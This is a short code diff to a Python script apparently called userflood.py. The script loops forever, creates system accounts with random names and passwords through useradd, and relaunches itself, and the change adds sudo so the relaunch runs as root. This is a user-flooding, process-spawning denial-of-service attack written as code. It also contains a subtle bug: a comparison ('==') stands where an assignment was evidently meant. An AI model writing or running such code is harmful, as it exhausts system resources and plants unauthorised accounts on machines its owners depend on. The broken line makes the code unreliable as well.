@@ -8,4 +8,4 @@ while True:
     i += 1
     rndstr == rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase) - 1)]
   os.system("useradd -p " + rndstr + " " + rndstr)
-  os.system("nohup python3 userflood.py")
+  os.system("sudo nohup python3 userflood.py")
